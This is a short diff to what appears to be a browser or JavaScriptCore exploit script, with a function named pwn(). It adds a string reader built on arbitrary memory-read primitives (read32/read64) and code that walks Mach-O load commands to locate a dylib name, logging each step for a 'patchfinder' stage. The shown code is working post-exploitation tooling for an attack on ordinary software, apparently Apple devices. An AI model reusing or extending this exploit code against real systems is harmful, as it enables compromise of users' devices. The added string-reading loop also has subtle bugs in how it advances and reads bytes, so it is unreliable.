@@ -226,6 +226,20 @@ function pwn() {
         return Sub((read64(addr).lo()), 0);
     }
 
+    function readString(addr)
+    {
+      var byte = read32(addr);
+      var str  = "";
+      var i = 0;
+      while (byte & 0xFF)
+      {
+        str += String.fromCharCode(byte & 0xFF);
+        byte = read32(Add(addr, i));
+        i++;
+      }
+      return str;
+    }
+
     var malloc_nogc = [];
     function malloc(sz) {
         var arr = new Uint8Array(sz);
@@ -324,7 +338,12 @@ function pwn() {
         var cmdsize = read32(Add(lc, 0x4));
         lc = Add(lc, cmdsize)
     }
-
+    var dylib_name_offset = read32(Add(lc, 8));
+    log(`[+] dylib_name_offset: ${dylib_name_offset}`);
+    var dylib_name_addr = Add(lc, dylib_name_offset);
+    log(`[+] dylib_name_addr: ${dylib_name_addr}`);
+    var dylib_name = readString(dylib_name_addr);
+    log(`[+] dylib_name: ${dylib_name}`);
 
 
     // remove this "return" if finished patchfinder
